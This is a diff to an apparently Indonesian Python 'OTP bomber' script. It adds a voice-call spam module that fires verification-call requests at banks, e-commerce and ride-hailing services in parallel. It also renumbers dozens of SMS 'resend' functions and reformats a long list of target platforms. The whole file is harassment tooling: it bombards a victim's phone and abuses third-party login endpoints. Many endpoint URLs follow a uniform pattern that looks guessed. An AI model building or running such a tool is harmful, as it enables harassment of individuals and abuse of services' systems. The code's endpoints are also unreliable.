@@ -4493,7 +4465,7 @@ def spam_uniqlo_resend(phone_plus):
     except:
         return None
 
-# 233. H&M Indonesia
+# 224. H&M Indonesia (Resend)
 def spam_hm_resend(phone_plus):
     url = "https://api.hm.com/v1/otp/resend"
     headers = {
@@ -4509,7 +4481,7 @@ def spam_hm_resend(phone_plus):
     except:
         return None
 
-# 234. Zara Indonesia
+# 225. Zara Indonesia (Resend)
 def spam_zara_resend(phone_plus):
     url = "https://api.zara.com/v1/otp/resend"
     headers = {
@@ -4525,7 +4497,7 @@ def spam_zara_resend(phone_plus):
     except:
         return None
 
-# 235. Cotton On Indonesia
+# 226. Cotton On Indonesia (Resend)
 def spam_cottonon_resend(phone_plus):
     url = "https://api.cottonon.com/v1/otp/resend"
     headers = {
@@ -4541,7 +4513,7 @@ def spam_cottonon_resend(phone_plus):
     except:
         return None
 
-# 236. Lotus
+# 227. Lotus (Resend)
 def spam_lotus_resend(phone_plus):
     url = "https://api.lotus.com/v1/otp/resend"
     headers = {
@@ -4557,7 +4529,7 @@ def spam_lotus_resend(phone_plus):
     except:
         return None
 
-# 237. Ralali
+# 228. Ralali (Resend)
 def spam_ralali_resend(phone_plus):
     url = "https://api.ralali.com/v1/otp/resend"
     headers = {
@@ -4573,7 +4545,7 @@ def spam_ralali_resend(phone_plus):
     except:
         return None
 
-# 238. Distributor
+# 229. Distributor (Resend)
 def spam_distributor_resend(phone_plus):
     url = "https://api.distributor.com/v1/otp/resend"
     headers = {
@@ -4589,7 +4561,7 @@ def spam_distributor_resend(phone_plus):
     except:
         return None
 
-# 239. MNC Play
+# 230. MNC Play (Resend)
 def spam_mncplay_resend(phone_plus):
     url = "https://api.mncplay.com/v1/otp/resend"
     headers = {
@@ -4605,7 +4577,7 @@ def spam_mncplay_resend(phone_plus):
     except:
         return None
 
-# 240. MyRepublic
+# 231. MyRepublic (Resend)
 def spam_myrepublic_resend(phone_plus):
     url = "https://api.myrepublic.com/v1/otp/resend"
     headers = {
@@ -4621,7 +4593,7 @@ def spam_myrepublic_resend(phone_plus):
     except:
         return None
 
-# 241. Biznet
+# 232. Biznet (Resend)
 def spam_biznet_resend(phone_plus):
     url = "https://api.biznet.com/v1/otp/resend"
     headers = {
@@ -4637,7 +4609,7 @@ def spam_biznet_resend(phone_plus):
     except:
         return None
 
-# 242. First Media
+# 233. First Media (Resend)
 def spam_firstmedia_resend(phone_plus):
     url = "https://api.firstmedia.com/v1/otp/resend"
     headers = {
@@ -4653,7 +4625,7 @@ def spam_firstmedia_resend(phone_plus):
     except:
         return None
 
-# 243. Oxygen
+# 234. Oxygen (Resend)
 def spam_oxygen_resend(phone_plus):
     url = "https://api.oxygen.com/v1/otp/resend"
     headers = {
@@ -4669,7 +4641,7 @@ def spam_oxygen_resend(phone_plus):
     except:
         return None
 
-# 244. CBN
+# 235. CBN (Resend)
 def spam_cbn_resend(phone_plus):
     url = "https://api.cbn.com/v1/otp/resend"
     headers = {
@@ -4685,7 +4657,7 @@ def spam_cbn_resend(phone_plus):
     except:
         return None
 
-# 245. XL Home
+# 236. XL Home (Resend)
 def spam_xlhome_resend(phone_plus):
     url = "https://api.xlhome.com/v1/otp/resend"
     headers = {
@@ -4701,7 +4673,7 @@ def spam_xlhome_resend(phone_plus):
     except:
         return None
 
-# 246. Smartfren
+# 237. Smartfren (Resend)
 def spam_smartfren_resend(phone_plus):
     url = "https://api.smartfren.com/v1/otp/resend"
     headers = {
@@ -4717,7 +4689,7 @@ def spam_smartfren_resend(phone_plus):
     except:
         return None
 
-# 247. IM3
+# 238. IM3 (Resend)
 def spam_im3_resend(phone_plus):
     url = "https://api.im3.com/v1/otp/resend"
     headers = {
@@ -4733,7 +4705,7 @@ def spam_im3_resend(phone_plus):
     except:
         return None
 
-# 248. Axis
+# 239. Axis (Resend)
 def spam_axis_resend(phone_plus):
     url = "https://api.axis.com/v1/otp/resend"
     headers = {
@@ -4749,7 +4721,7 @@ def spam_axis_resend(phone_plus):
     except:
         return None
 
-# 249. Tri
+# 240. Tri (Resend)
 def spam_tri_resend(phone_plus):
     url = "https://api.tri.com/v1/otp/resend"
     headers = {
@@ -4765,7 +4737,7 @@ def spam_tri_resend(phone_plus):
     except:
         return None
 
-# 250. By.U
+# 241. By.U (Resend)
 def spam_byu_resend(phone_plus):
     url = "https://api.byu.com/v1/otp/resend"
     headers = {
@@ -4781,7 +4753,7 @@ def spam_byu_resend(phone_plus):
     except:
         return None
 
-# 251. BTS (Bank Tabungan Negara)
+# 242. BTN (Resend)
 def spam_btn_resend2(phone_08):
     url = "https://api.btn.co.id/otp/resend"
     headers = {
@@ -4797,7 +4769,7 @@ def spam_btn_resend2(phone_08):
     except:
         return None
 
-# 252. BJB (Bank Jawa Barat)
+# 243. BJB (Resend)
 def spam_bjb_resend2(phone_08):
     url = "https://api.bjb.co.id/otp/resend"
     headers = {
@@ -4813,7 +4785,7 @@ def spam_bjb_resend2(phone_08):
     except:
         return None
 
-# 253. Bank Jatim
+# 244. Bank Jatim (Resend)
 def spam_bankjatim_resend(phone_08):
     url = "https://api.bankjatim.com/otp/resend"
     headers = {
@@ -4829,7 +4801,7 @@ def spam_bankjatim_resend(phone_08):
     except:
         return None
 
-# 254. Bank Sulsel
+# 245. Bank Sulsel (Resend)
 def spam_banksulsel_resend(phone_08):
     url = "https://api.banksulsel.com/otp/resend"
     headers = {
@@ -4845,7 +4817,7 @@ def spam_banksulsel_resend(phone_08):
     except:
         return None
 
-# 255. Bank Sumut
+# 246. Bank Sumut (Resend)
 def spam_banksumut_resend(phone_08):
     url = "https://api.banksumut.com/otp/resend"
     headers = {
@@ -4861,7 +4833,7 @@ def spam_banksumut_resend(phone_08):
     except:
         return None
 
-# 256. Bank Kaltim
+# 247. Bank Kaltim (Resend)
 def spam_bankkaltim_resend(phone_08):
     url = "https://api.bankkaltim.com/otp/resend"
     headers = {
@@ -4877,7 +4849,7 @@ def spam_bankkaltim_resend(phone_08):
     except:
         return None
 
-# 257. Bank Papua
+# 248. Bank Papua (Resend)
 def spam_bankpapua_resend(phone_08):
     url = "https://api.bankpapua.com/otp/resend"
     headers = {
@@ -4893,7 +4865,7 @@ def spam_bankpapua_resend(phone_08):
     except:
         return None
 
-# 258. Bank Maluku
+# 249. Bank Maluku (Resend)
 def spam_bankmaluku_resend(phone_08):
     url = "https://api.bankmaluku.com/otp/resend"
     headers = {
@@ -4907,9 +4879,250 @@ def spam_bankmaluku_resend(phone_08):
     try:
         return requests.post(url, headers=headers, json=payload, timeout=10)
     except:
-        return None                                                                    
+        return None
+
 # ============================================================
-# DAFTAR PLATFORM (72+)
+# VOICE OTP (SPAM CALL) - 12+ PLATFORM
+# ============================================================
+
+# ---------- VOICE OTP FUNCTIONS ----------
+def spam_gojek_voice(phone_plus):
+    url = "https://api.gojekapi.com/v1/customers/register"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json",
+        "Content-Type": "application/json",
+        "Origin": "https://www.gojek.com",
+    }
+    payload = {"phone_number": phone_plus, "country_code": "62", "method": "call"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+def spam_tokopedia_voice(phone_08):
+    url = "https://accounts.tokopedia.com/otp/c/ajax/request-call"
+    headers = {
+        "User-Agent": get_ua(),
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Origin": "https://accounts.tokopedia.com",
+    }
+    data = {"msisdn": phone_08, "otp_type": "116"}
+    try:
+        return requests.post(url, headers=headers, data=data, timeout=10)
+    except:
+        return None
+
+def spam_shopee_voice(phone_plus):
+    url = "https://shopee.co.id/api/v1/account/phone/request_otp"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json",
+        "Content-Type": "application/json",
+        "Origin": "https://shopee.co.id",
+    }
+    payload = {"phone": phone_plus, "request_id": str(uuid.uuid4()), "source": "login", "method": "voice"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+def spam_grab_voice(phone_plus):
+    url = "https://api.grab.com/v1/authentication/otp/request"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json",
+        "Content-Type": "application/json",
+        "Origin": "https://www.grab.com",
+    }
+    payload = {"phoneNumber": phone_plus, "countryCode": "62", "channel": "voice"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+def spam_ovo_voice(phone_plus):
+    url = "https://api.ovo.id/api/v1/auth/otp/request"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json",
+        "Content-Type": "application/json",
+        "Origin": "https://www.ovo.id",
+    }
+    payload = {"phone": phone_plus, "countryCode": "62", "type": "voice"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+def spam_lazada_voice(phone_plus):
+    url = "https://auth.lazada.co.id/rest/auth/otp/generate"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json",
+        "Content-Type": "application/json",
+        "Origin": "https://auth.lazada.co.id",
+    }
+    payload = {"mobile": phone_plus, "type": "login", "action": "voice"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+def spam_bukalapak_voice(phone_plus):
+    url = "https://api.bukalapak.com/v2/otp.json"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json",
+        "Content-Type": "application/json",
+        "Origin": "https://www.bukalapak.com",
+    }
+    payload = {"phone": phone_plus, "type": "voice", "method": "send_otp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+def spam_bca_voice(phone_08):
+    url = "https://api.bca.co.id/otp/request"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json",
+        "Content-Type": "application/json",
+        "Origin": "https://www.bca.co.id",
+    }
+    payload = {"msisdn": phone_08, "type": "voice", "channel": "otp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+def spam_mandiri_voice(phone_08):
+    url = "https://api.bankmandiri.co.id/otp/send"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json",
+        "Content-Type": "application/json",
+        "Origin": "https://www.bankmandiri.co.id",
+    }
+    payload = {"phone": phone_08, "type": "voice", "channel": "otp"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+def spam_bri_voice(phone_08):
+    url = "https://api.bri.co.id/otp/send"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json",
+        "Content-Type": "application/json",
+        "Origin": "https://www.bri.co.id",
+    }
+    payload = {"phoneNumber": phone_08, "type": "voice"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+def spam_klook_voice(phone_plus):
+    url = "https://www.klook.com/v2/userapisrv/public/verification/code/send?trace_id=" + str(uuid.uuid4())
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json",
+        "Content-Type": "application/json",
+        "Origin": "https://www.klook.com",
+    }
+    payload = {
+        "action": "login_register",
+        "type": 2,
+        "rcv": phone_plus,
+        "is_resend": False,
+        "payload": {"mobile": phone_plus, "term_ids": [330]},
+    }
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+def spam_traveloka_voice(phone_plus):
+    url = "https://api.traveloka.com/v1/otp/request"
+    headers = {
+        "User-Agent": get_ua(),
+        "Accept": "application/json",
+        "Content-Type": "application/json",
+        "Origin": "https://www.traveloka.com",
+    }
+    payload = {"phone": phone_plus, "type": "voice"}
+    try:
+        return requests.post(url, headers=headers, json=payload, timeout=10)
+    except:
+        return None
+
+# ---------- DAFTAR VOICE PLATFORM ----------
+VOICE_PLATFORMS = [
+    ("Gojek Voice", spam_gojek_voice, "plus"),
+    ("Tokopedia Voice", spam_tokopedia_voice, "08"),
+    ("Shopee Voice", spam_shopee_voice, "plus"),
+    ("Grab Voice", spam_grab_voice, "plus"),
+    ("OVO Voice", spam_ovo_voice, "plus"),
+    ("Lazada Voice", spam_lazada_voice, "plus"),
+    ("Bukalapak Voice", spam_bukalapak_voice, "plus"),
+    ("BCA Voice", spam_bca_voice, "08"),
+    ("Mandiri Voice", spam_mandiri_voice, "08"),
+    ("BRI Voice", spam_bri_voice, "08"),
+    ("Klook Voice", spam_klook_voice, "plus"),
+    ("Traveloka Voice", spam_traveloka_voice, "plus"),
+]
+
+# ---------- SPAM CALL ALL ----------
+def spam_call_all(phone_08, phone_62, phone_plus, phone_nocode, phone_int):
+    print(f"\n{Color.GOLD}┌────────────────────────────────────────────────────────────┐{Color.RESET}")
+    print(f"{Color.GOLD}│ {Color.BOLD}📞 SPAM CALL (VOICE OTP) {len(VOICE_PLATFORMS)} PLATFORM{Color.RESET}      {Color.DIM}{datetime.now().strftime('%H:%M:%S')}{Color.GOLD}  │{Color.RESET}")
+    print(f"{Color.GOLD}└────────────────────────────────────────────────────────────┘{Color.RESET}\n")
+    loading("Mengirim Voice OTP", 0.8)
+    success_count = 0
+
+    def run_voice(name, func, format_type):
+        if format_type == "08":
+            phone = phone_08
+        elif format_type == "62":
+            phone = phone_62
+        elif format_type == "plus":
+            phone = phone_plus
+        elif format_type == "nocode":
+            phone = phone_nocode
+        elif format_type == "int":
+            phone = phone_int
+        else:
+            phone = phone_08
+        try:
+            resp = func(phone)
+            success, msg = is_success(resp)
+            return name, success, msg
+        except:
+            return name, False, "Error"
+
+    with ThreadPoolExecutor(max_workers=10) as executor:
+        futures = {executor.submit(run_voice, name, func, fmt): (name, fmt) for name, func, fmt in VOICE_PLATFORMS}
+        for future in as_completed(futures):
+            name, success, msg = future.result()
+            if success:
+                success_count += 1
+                print(f"  {Color.GREEN}✅{Color.RESET} {name:<16}  {Color.GREEN}→ {msg}{Color.RESET}")
+            else:
+                if "Forbidden" in msg or "Captcha" in msg:
+                    print(f"  {Color.YELLOW}⚠️ {Color.RESET} {name:<16}  {Color.YELLOW}→ {msg}{Color.RESET}")
+                else:
+                    print(f"  {Color.RED}❌{Color.RESET} {name:<16}  {Color.RED}→ {msg}{Color.RESET}")
+
+    print(f"\n{Color.GOLD}┌────────────────────────────────────────────────────────────┐{Color.RESET}")
+    print(f"{Color.GOLD}│ {Color.BOLD}📊 HASIL CALL:{Color.RESET} {Color.GREEN}{success_count}{Color.RESET}/{Color.WHITE}{len(VOICE_PLATFORMS)}{Color.RESET} SUKSES  {Color.DIM}• {datetime.now().strftime('%H:%M:%S')}{Color.GOLD}  │{Color.RESET}")
+    print(f"{Color.GOLD}└────────────────────────────────────────────────────────────┘{Color.RESET}")
+    return success_count
+
+# ============================================================
+# DAFTAR PLATFORM OTP (SEMUA + RESEND)
 # ============================================================
 PLATFORMS = [
     ("Internet Rakyat", spam_internetrakyat, "08"),
@@ -5013,158 +5226,158 @@ PLATFORMS = [
     ("Kredivo", spam_kredivo, "plus"),
     ("Akulaku", spam_akulaku, "plus"),
     ("Alodokter", spam_alodokter, "plus"),
-("KlikDokter", spam_klikdokter, "plus"),
-("Quipper", spam_quipper, "plus"),
-("Payfazz", spam_payfazz, "plus"),
-("Tcash", spam_tcash, "plus"),
-("Cashbac", spam_cashbac, "plus"),
-("Agoda", spam_agoda, "plus"),
-("Booking.com", spam_booking, "plus"),
-("Pegipegi", spam_pegipegi, "plus"),
-("RedDoorz", spam_reddoorz, "plus"),
-("Airy Rooms", spam_airyrooms, "plus"),
-("ZenRooms", spam_zenrooms, "plus"),
-("Bobobox", spam_bobobox, "plus"),
-("Moka", spam_moka, "plus"),
-("Pawoon", spam_pawoon, "plus"),
-("Jurnal", spam_jurnal, "plus"),
-("Talenta", spam_talenta, "plus"),
-("Sleekr", spam_sleekr, "plus"),
-("Ukirama", spam_ukirama, "plus"),
-("Widya", spam_widya, "plus"),
-("Doku", spam_doku, "plus"),
-("Midtrans", spam_midtrans, "plus"),
-("Xendit", spam_xendit, "plus"),
-("GoPay", spam_gopay, "plus"),
-("ShopeePay", spam_shopeepay, "plus"),
-("Indomaret", spam_indomaret, "plus"),
-("Alfamart", spam_alfamart, "plus"),
-("KFC", spam_kfc, "plus"),
-("McDonald's", spam_mcd, "plus"),
-("Starbucks", spam_starbucks, "plus"),
-("Shopee (Resend)", spam_shopee_resend, "plus"),
-("Gojek (Resend)", spam_gojek_resend, "plus"),
-("OVO (Resend)", spam_ovo_resend, "plus"),
-("Grab (Resend)", spam_grab_resend, "plus"),
-("Lazada (Resend)", spam_lazada_resend, "plus"),
-("Bukalapak (Resend)", spam_bukalapak_resend, "plus"),
-("BCA (Resend)", spam_bca_resend, "08"),
-("Mandiri (Resend)", spam_mandiri_resend, "08"),
-("TikTok (Resend)", spam_tiktok_resend, "plus"),
-("Instagram (Resend)", spam_instagram_resend, "plus"),
-("Facebook (Resend)", spam_facebook_resend, "plus"),
-("Twitter (Resend)", spam_twitter_resend, "plus"),
-("Telegram (Resend)", spam_telegram_resend, "plus"),
-("WhatsApp (Resend)", spam_whatsapp_resend, "plus"),
-("LINE (Resend)", spam_line_resend, "plus"),
-("WeChat (Resend)", spam_wechat_resend, "plus"),
-("Signal (Resend)", spam_signal_resend, "plus"),
-("Discord (Resend)", spam_discord_resend, "plus"),
-("TIX ID (Resend)", spam_tixid_resend, "plus"),
-("M-Tix (Resend)", spam_mtix_resend, "plus"),
-("Pelago (Resend)", spam_pelago_resend, "plus"),
-("Kkday (Resend)", spam_kkday_resend, "plus"),
-("Sakuku (Resend)", spam_sakuku_resend, "plus"),
-("BNI Mobile (Resend)", spam_bni_mobile_resend, "08"),
-("CIMB Niaga (Resend)", spam_cimb_resend, "08"),
-("Danamon (Resend)", spam_danamon_resend, "08"),
-("Permata (Resend)", spam_permata_resend, "08"),
-("OCBC (Resend)", spam_ocbc_resend, "08"),
-("UOB (Resend)", spam_uob_resend, "08"),
-("HSBC (Resend)", spam_hsbc_resend, "08"),
-("Citibank (Resend)", spam_citibank_resend, "08"),
-("Standard Chartered (Resend)", spam_scb_resend, "08"),
-("Maybank (Resend)", spam_maybank_resend, "08"),
-("Mega (Resend)", spam_mega_resend, "08"),
-("Bukopin (Resend)", spam_bukopin_resend, "08"),
-("Jago (Resend)", spam_jago_resend, "08"),
-("Aladin (Resend)", spam_aladin_resend, "08"),
-("Seabank (Resend)", spam_seabank_resend, "08"),
-("Superbank (Resend)", spam_superbank_resend, "08"),
-("Neo Commerce (Resend)", spam_neocommerce_resend, "08"),
-("Bank Raya (Resend)", spam_bankraya_resend, "08"),
-("Home Credit (Resend)", spam_homecredit_resend, "08"),
-("BFI Finance (Resend)", spam_bfi_resend, "08"),
-("FIF Group (Resend)", spam_fif_resend, "08"),
-("Mandiri Tunas Finance (Resend)", spam_mtf_resend, "08"),
-("OTO Group (Resend)", spam_oto_resend, "08"),
-("Suzuki Finance (Resend)", spam_suzuki_finance_resend, "08"),
-("Honda Finance (Resend)", spam_honda_finance_resend, "08"),
-("Yamaha Finance (Resend)", spam_yamaha_finance_resend, "08"),
-("Astra Credit (Resend)", spam_astra_credit_resend, "08"),
-("Bank Mega (Resend)", spam_bankmega_resend, "08"),
-("Bank Permata (Resend)", spam_bankpermata_resend, "08"),
-("Bank Mayapada (Resend)", spam_mayapada_resend, "08"),
-("Bank Ina (Resend)", spam_bankina_resend, "08"),
-("Bank Sinarmas (Resend)", spam_sinarmas_resend, "08"),
-("Bank Bukopin (Resend)", spam_bukopin_resend2, "08"),
-("Bank Jago (Resend)", spam_bankjago_resend, "08"),
-("Bank Aladin (Resend)", spam_bankaladin_resend, "08"),
-("Seabank (Resend)", spam_seabank_resend2, "08"),
-("Superbank (Resend)", spam_superbank_resend2, "08"),
-("Bank Neo Commerce (Resend)", spam_neocommerce_resend2, "08"),
-("Bank Raya (Resend)", spam_bankraya_resend2, "08"),
-("Bank Capital (Resend)", spam_bankcapital_resend, "08"),
-("Bank Maspion (Resend)", spam_bankmaspion_resend, "08"),
-("Bank Ganesha (Resend)", spam_bankganesha_resend, "08"),
-("Bank Bumi Arta (Resend)", spam_bumiarta_resend, "08"),
-("Bank Ekonomi (Resend)", spam_bankekonomi_resend, "08"),
-("Bank Hana (Resend)", spam_bankhana_resend, "08"),
-("Bank ICBC (Resend)", spam_bankicbc_resend, "08"),
-("Zoom (Resend)", spam_zoom_resend, "plus"),
-("Shopify (Resend)", spam_shopify_resend, "plus"),
-("Wix (Resend)", spam_wix_resend, "plus"),
-("WordPress (Resend)", spam_wordpress_resend, "plus"),
-("Tumblr (Resend)", spam_tumblr_resend, "plus"),
-("Flickr (Resend)", spam_flickr_resend, "plus"),
-("Imgur (Resend)", spam_imgur_resend, "plus"),
-("Pinterest (Resend)", spam_pinterest_resend, "plus"),
-("Snapchat (Resend)", spam_snapchat_resend, "plus"),
-("LinkedIn (Resend)", spam_linkedin_resend, "plus"),
-("Tinder (Resend)", spam_tinder_resend, "plus"),
-("Bumble (Resend)", spam_bumble_resend, "plus"),
-("OKCupid (Resend)", spam_okcupid_resend, "plus"),
-("Zoosk (Resend)", spam_zoosk_resend, "plus"),
-("Zalora (Resend)", spam_zalora_resend, "plus"),
-("Berrybenka (Resend)", spam_berrybenka_resend, "plus"),
-("Hijup (Resend)", spam_hijup_resend, "plus"),
-("Bhinneka (Resend)", spam_bhinneka_resend, "plus"),
-("Sephora (Resend)", spam_sephora_resend, "plus"),
-("Guardian (Resend)", spam_guardian_resend, "plus"),
-("Century (Resend)", spam_century_resend, "plus"),
-("Adidas (Resend)", spam_adidas_resend, "plus"),
-("Nike (Resend)", spam_nike_resend, "plus"),
-("Uniqlo (Resend)", spam_uniqlo_resend, "plus"),
-("H&M (Resend)", spam_hm_resend, "plus"),
-("Zara (Resend)", spam_zara_resend, "plus"),
-("Cotton On (Resend)", spam_cottonon_resend, "plus"),
-("Lotus (Resend)", spam_lotus_resend, "plus"),
-("Ralali (Resend)", spam_ralali_resend, "plus"),
-("Distributor (Resend)", spam_distributor_resend, "plus"),
-("MNC Play (Resend)", spam_mncplay_resend, "plus"),
-("MyRepublic (Resend)", spam_myrepublic_resend, "plus"),
-("Biznet (Resend)", spam_biznet_resend, "plus"),
-("First Media (Resend)", spam_firstmedia_resend, "plus"),
-("Oxygen (Resend)", spam_oxygen_resend, "plus"),
-("CBN (Resend)", spam_cbn_resend, "plus"),
-("XL Home (Resend)", spam_xlhome_resend, "plus"),
-("Smartfren (Resend)", spam_smartfren_resend, "plus"),
-("IM3 (Resend)", spam_im3_resend, "plus"),
-("Axis (Resend)", spam_axis_resend, "plus"),
-("Tri (Resend)", spam_tri_resend, "plus"),
-("By.U (Resend)", spam_byu_resend, "plus"),
-("BTN (Resend)", spam_btn_resend2, "08"),
-("BJB (Resend)", spam_bjb_resend2, "08"),
-("Bank Jatim (Resend)", spam_bankjatim_resend, "08"),
-("Bank Sulsel (Resend)", spam_banksulsel_resend, "08"),
-("Bank Sumut (Resend)", spam_banksumut_resend, "08"),
-("Bank Kaltim (Resend)", spam_bankkaltim_resend, "08"),
-("Bank Papua (Resend)", spam_bankpapua_resend, "08"),
-("Bank Maluku (Resend)", spam_bankmaluku_resend, "08"),
+    ("KlikDokter", spam_klikdokter, "plus"),
+    ("Quipper", spam_quipper, "plus"),
+    ("Payfazz", spam_payfazz, "plus"),
+    ("Tcash", spam_tcash, "plus"),
+    ("Cashbac", spam_cashbac, "plus"),
+    ("Agoda", spam_agoda, "plus"),
+    ("Booking.com", spam_booking, "plus"),
+    ("Pegipegi", spam_pegipegi, "plus"),
+    ("RedDoorz", spam_reddoorz, "plus"),
+    ("Airy Rooms", spam_airyrooms, "plus"),
+    ("ZenRooms", spam_zenrooms, "plus"),
+    ("Bobobox", spam_bobobox, "plus"),
+    ("Moka", spam_moka, "plus"),
+    ("Pawoon", spam_pawoon, "plus"),
+    ("Jurnal", spam_jurnal, "plus"),
+    ("Talenta", spam_talenta, "plus"),
+    ("Sleekr", spam_sleekr, "plus"),
+    ("Ukirama", spam_ukirama, "plus"),
+    ("Widya", spam_widya, "plus"),
+    ("Doku", spam_doku, "plus"),
+    ("Midtrans", spam_midtrans, "plus"),
+    ("Xendit", spam_xendit, "plus"),
+    ("GoPay", spam_gopay, "plus"),
+    ("ShopeePay", spam_shopeepay, "plus"),
+    ("Indomaret", spam_indomaret, "plus"),
+    ("Alfamart", spam_alfamart, "plus"),
+    ("KFC", spam_kfc, "plus"),
+    ("McDonald's", spam_mcd, "plus"),
+    ("Starbucks", spam_starbucks, "plus"),
+    ("Shopee (Resend)", spam_shopee_resend, "plus"),
+    ("Gojek (Resend)", spam_gojek_resend, "plus"),
+    ("OVO (Resend)", spam_ovo_resend, "plus"),
+    ("Grab (Resend)", spam_grab_resend, "plus"),
+    ("Lazada (Resend)", spam_lazada_resend, "plus"),
+    ("Bukalapak (Resend)", spam_bukalapak_resend, "plus"),
+    ("BCA (Resend)", spam_bca_resend, "08"),
+    ("Mandiri (Resend)", spam_mandiri_resend, "08"),
+    ("TikTok (Resend)", spam_tiktok_resend, "plus"),
+    ("Instagram (Resend)", spam_instagram_resend, "plus"),
+    ("Facebook (Resend)", spam_facebook_resend, "plus"),
+    ("Twitter (Resend)", spam_twitter_resend, "plus"),
+    ("Telegram (Resend)", spam_telegram_resend, "plus"),
+    ("WhatsApp (Resend)", spam_whatsapp_resend, "plus"),
+    ("LINE (Resend)", spam_line_resend, "plus"),
+    ("WeChat (Resend)", spam_wechat_resend, "plus"),
+    ("Signal (Resend)", spam_signal_resend, "plus"),
+    ("Discord (Resend)", spam_discord_resend, "plus"),
+    ("TIX ID (Resend)", spam_tixid_resend, "plus"),
+    ("M-Tix (Resend)", spam_mtix_resend, "plus"),
+    ("Pelago (Resend)", spam_pelago_resend, "plus"),
+    ("Kkday (Resend)", spam_kkday_resend, "plus"),
+    ("Sakuku (Resend)", spam_sakuku_resend, "plus"),
+    ("BNI Mobile (Resend)", spam_bni_mobile_resend, "08"),
+    ("CIMB Niaga (Resend)", spam_cimb_resend, "08"),
+    ("Danamon (Resend)", spam_danamon_resend, "08"),
+    ("Permata (Resend)", spam_permata_resend, "08"),
+    ("OCBC (Resend)", spam_ocbc_resend, "08"),
+    ("UOB (Resend)", spam_uob_resend, "08"),
+    ("HSBC (Resend)", spam_hsbc_resend, "08"),
+    ("Citibank (Resend)", spam_citibank_resend, "08"),
+    ("Standard Chartered (Resend)", spam_scb_resend, "08"),
+    ("Maybank (Resend)", spam_maybank_resend, "08"),
+    ("Mega (Resend)", spam_mega_resend, "08"),
+    ("Bukopin (Resend)", spam_bukopin_resend, "08"),
+    ("Jago (Resend)", spam_jago_resend, "08"),
+    ("Aladin (Resend)", spam_aladin_resend, "08"),
+    ("Seabank (Resend)", spam_seabank_resend, "08"),
+    ("Superbank (Resend)", spam_superbank_resend, "08"),
+    ("Neo Commerce (Resend)", spam_neocommerce_resend, "08"),
+    ("Bank Raya (Resend)", spam_bankraya_resend, "08"),
+    ("Home Credit (Resend)", spam_homecredit_resend, "08"),
+    ("BFI Finance (Resend)", spam_bfi_resend, "08"),
+    ("FIF Group (Resend)", spam_fif_resend, "08"),
+    ("Mandiri Tunas Finance (Resend)", spam_mtf_resend, "08"),
+    ("OTO Group (Resend)", spam_oto_resend, "08"),
+    ("Suzuki Finance (Resend)", spam_suzuki_finance_resend, "08"),
+    ("Honda Finance (Resend)", spam_honda_finance_resend, "08"),
+    ("Yamaha Finance (Resend)", spam_yamaha_finance_resend, "08"),
+    ("Astra Credit (Resend)", spam_astra_credit_resend, "08"),
+    ("Bank Mega (Resend)", spam_bankmega_resend, "08"),
+    ("Bank Permata (Resend)", spam_bankpermata_resend, "08"),
+    ("Bank Mayapada (Resend)", spam_mayapada_resend, "08"),
+    ("Bank Ina (Resend)", spam_bankina_resend, "08"),
+    ("Bank Sinarmas (Resend)", spam_sinarmas_resend, "08"),
+    ("Bank Bukopin (Resend)", spam_bukopin_resend2, "08"),
+    ("Bank Jago (Resend)", spam_bankjago_resend, "08"),
+    ("Bank Aladin (Resend)", spam_bankaladin_resend, "08"),
+    ("Seabank (Resend)", spam_seabank_resend2, "08"),
+    ("Superbank (Resend)", spam_superbank_resend2, "08"),
+    ("Bank Neo Commerce (Resend)", spam_neocommerce_resend2, "08"),
+    ("Bank Raya (Resend)", spam_bankraya_resend2, "08"),
+    ("Bank Capital (Resend)", spam_bankcapital_resend, "08"),
+    ("Bank Maspion (Resend)", spam_bankmaspion_resend, "08"),
+    ("Bank Ganesha (Resend)", spam_bankganesha_resend, "08"),
+    ("Bank Bumi Arta (Resend)", spam_bumiarta_resend, "08"),
+    ("Bank Ekonomi (Resend)", spam_bankekonomi_resend, "08"),
+    ("Bank Hana (Resend)", spam_bankhana_resend, "08"),
+    ("Bank ICBC (Resend)", spam_bankicbc_resend, "08"),
+    ("Zoom (Resend)", spam_zoom_resend, "plus"),
+    ("Shopify (Resend)", spam_shopify_resend, "plus"),
+    ("Wix (Resend)", spam_wix_resend, "plus"),
+    ("WordPress (Resend)", spam_wordpress_resend, "plus"),
+    ("Tumblr (Resend)", spam_tumblr_resend, "plus"),
+    ("Flickr (Resend)", spam_flickr_resend, "plus"),
+    ("Imgur (Resend)", spam_imgur_resend, "plus"),
+    ("Pinterest (Resend)", spam_pinterest_resend, "plus"),
+    ("Snapchat (Resend)", spam_snapchat_resend, "plus"),
+    ("LinkedIn (Resend)", spam_linkedin_resend, "plus"),
+    ("Tinder (Resend)", spam_tinder_resend, "plus"),
+    ("Bumble (Resend)", spam_bumble_resend, "plus"),
+    ("OKCupid (Resend)", spam_okcupid_resend, "plus"),
+    ("Zoosk (Resend)", spam_zoosk_resend, "plus"),
+    ("Zalora (Resend)", spam_zalora_resend, "plus"),
+    ("Berrybenka (Resend)", spam_berrybenka_resend, "plus"),
